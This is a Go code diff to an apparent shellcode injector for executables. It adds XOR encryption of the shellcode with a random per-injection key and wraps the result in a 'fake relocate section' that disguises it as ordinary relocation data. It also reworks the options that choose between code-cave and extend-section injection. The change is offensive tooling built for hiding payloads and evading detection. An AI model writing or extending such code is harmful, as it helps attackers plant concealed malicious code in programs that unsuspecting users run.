@@ -392,6 +392,9 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 }
 
 func (inj *Injector) selectReadMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
+	if inj.opts.ForceExtendSection && inj.opts.ForceCodeCave {
+		return "", errors.New("invalid read shellcode mode")
+	}
 	// make sure shellcode is 4 or 8 bytes alignment
 	switch inj.arch {
 	case "386":
@@ -420,7 +423,7 @@ func (inj *Injector) selectReadMode(ctx *loaderCtx, sc []byte, src string) (stri
 		numCaves = (len(sc)/8 + 1) * numInstForCopyShellcode
 	}
 	if minNumCaves+numCaves > len(inj.caves) {
-		if inj.opts.DisableExtendSection {
+		if inj.opts.ForceCodeCave {
 			return "", errors.New("shellcode is too large and extend section is disabled")
 		}
 		inj.useExtendSectionMode(ctx, sc)
@@ -466,8 +469,53 @@ func (inj *Injector) useCodeCaveMode(ctx *loaderCtx, sc []byte, src string) (str
 }
 
 func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte) {
+	// encrypt shellcode
+	encrypted := make([]byte, len(sc))
+	switch inj.arch {
+	case "386":
+		key := inj.rand.Uint32()
+		ctx.ShellcodeKey = key
+		for i := 0; i < len(sc); i += 4 {
+			val := binary.LittleEndian.Uint32(sc[i:])
+			binary.LittleEndian.PutUint32(encrypted[i:], val^key)
+		}
+	case "amd64":
+		key := inj.rand.Uint64()
+		ctx.ShellcodeKey = key
+		for i := 0; i < len(sc); i += 8 {
+			val := binary.LittleEndian.Uint64(sc[i:])
+			binary.LittleEndian.PutUint64(encrypted[i:], val^key)
+		}
+	}
+	// build a fake relocate section data
+	section := bytes.NewBuffer(make([]byte, 0, len(encrypted)*2))
+	begin := uint8(160 + inj.rand.Intn(32))
+	var counter int
+	for i := 0; i < len(encrypted); i++ {
+		section.WriteByte(encrypted[i])
+		section.WriteByte(begin)
+		counter++
+		vv := inj.rand.Intn(10)
+		switch {
+		case vv == 0:
+			if counter >= 8 {
+				begin++
+				counter = 0
+			}
+		case vv >= 4:
+			if counter >= 7 {
+				begin++
+				counter = 0
+			}
+		default:
+			if counter >= 9 {
+				begin++
+				counter = 0
+			}
+		}
+	}
 	ctx.SectionMode = true
-	ctx.SectionOffset = inj.extendSection(sc)
+	ctx.SectionOffset = inj.extendSection(section.Bytes())
 }
 
 func toUTF16(s string) string {
